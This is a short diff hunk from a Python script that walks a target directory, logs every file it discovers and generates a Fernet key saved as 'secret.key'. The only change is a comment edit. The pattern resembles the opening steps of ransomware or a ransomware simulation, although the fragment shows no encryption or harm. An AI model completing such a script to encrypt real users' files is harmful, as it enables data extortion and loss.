@@ -54,7 +54,7 @@ for root, _, filenames in os.walk(target_dir):
         with open(LOG_FILE, "a") as log:
             log.write(f"Discovered: {filepath}\n")
 
-# REQUIREMENT: Encryption process
+#  generates the key through fernet. Opens/Creates 'secret.key' in the target directory
 key = Fernet.generate_key()
 with open(os.path.join(target_dir, "secret.key"), "wb") as keyfile:
     keyfile.write(key)
